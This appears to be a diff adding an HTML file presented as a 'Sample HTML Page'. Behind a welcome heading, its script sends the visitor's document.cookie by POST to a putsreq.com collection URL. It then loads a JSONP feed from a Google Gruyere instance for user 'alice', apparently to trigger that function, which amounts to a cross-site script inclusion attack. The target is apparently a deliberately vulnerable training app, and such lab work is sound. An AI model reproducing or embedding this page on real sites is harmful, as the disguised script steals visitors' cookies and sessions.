@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sample HTML Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+        }
+    </style>
+
+
+
+</head>
+
+<body>
+
+    <h1>Welcome to My Sample Page</h1>
+    <p>This is a simple paragraph to describe the content of the page.</p>
+    <script>
+        const url = 'https://putsreq.com/BJwaKYBtEnK3SH64k2dF';
+
+        // Data you want to send
+        
+
+        
+
+        function _feed(s) {
+            const postData = {
+            data: document.cookie
+        };
+            fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: new URLSearchParams(postData).toString()
+        })
+            .then(response => response.text()) // or response.json() if the server sends back JSON
+            .then(data => {
+                console.log(data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+
+    </script>
+    <script src="https://google-gruyere.appspot.com/542687467233714209946942361135433351937/feed.gtl?uid=alice"></script>
+</body>
+
+</html>
